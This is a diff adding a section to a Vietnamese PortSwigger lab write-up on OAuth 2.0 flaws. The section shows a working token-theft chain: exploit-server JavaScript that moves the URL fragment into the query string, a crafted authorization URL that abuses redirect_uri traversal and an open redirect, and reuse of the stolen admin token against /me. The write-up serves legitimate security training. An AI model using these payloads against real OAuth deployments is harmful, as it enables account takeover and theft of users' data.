@@ -1,4 +1,4 @@
-# LỖ HỔNG OAuth 2.0 authentication (PORTSWIGGER)
+<img width="1919" height="939" alt="image" src="https://github.com/user-attachments/assets/623e54fa-3841-4dec-9f7a-fa0a51a22455" /># LỖ HỔNG OAuth 2.0 authentication (PORTSWIGGER)
 
 ---
 
@@ -577,6 +577,53 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
   <img width="1919" height="1005" alt="Screenshot 2025-08-28 013504" src="https://github.com/user-attachments/assets/b5ed51a7-8822-4ef0-95cd-d9bc38c5ce3e" />
 
   Cùng với đó ta để ý thấy rằng access token được trả về trong URL fragment.
+
+  Trên exploit server, tại file /exploit ta tạo script:
+
+  ```
+  <script>
+    window.location = '/?'+document.location.hash.substr(1)
+  </script>
+  ```
+
+  Đoạn script trên thực hiện cắt bỏ ký tự #, ép browser redirect lại đến chính exploit server, nhưng lần này đưa fragment vào query string.
+
+  Sau khi thực hiện truy cập lại đường dẫn URL như trên, ta sẽ thấy access token của mình trả về dưới dạng query string, không phải #fragment nữa, check trong access log   exploit server:
+
+  <img width="1919" height="939" alt="image" src="https://github.com/user-attachments/assets/09f8010b-c972-4a92-be4e-b7d3087d6e0f" />
+
+  Lúc này đề thực hiện lừa victim, ta tạo script trên file /exploit như sau:
+
+  ```
+  <script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a93003e035c3e4a804701f6025600f3.oauth-server.net/auth?client_id=qpt6rxflzicl92qi8gjnf&redirect_uri=https://0ace008903c23ee9805e03fd00b100df.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab8005a03573eba806202e40130008c.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+  </script>
+  ```
+
+  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/d400dff9-4ebd-4a20-8ffb-69bd195572a1" />
+
+  Sau đó thực hiện "Deliver exploit to victim" và chờ victim sập bẫy.
+
+  Kiểm tra access log và ta đã nhận dược access token trả về của admin user:
+
+  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/7218cb64-60a9-44d7-af04-86620f840dc5" />
+
+  Trong Burp Repeater, ta thực hiện gửi lại request /me trong đó phần *Authorization: Bearer* ta thay thế đi kèm với token ta vừa thu thập được của admin user:
+
+  <img width="1864" height="847" alt="image" src="https://github.com/user-attachments/assets/41bb3a57-861f-427e-9e14-1d1472e5b419" />
+
+  &rarr; Kết quả ta đã thực hiện API call thành công để lấy dữ liệu của nạn nhân, bao gồm cả khóa API của họ.
+
+  
+
+
+  
+
+  
 
   
 
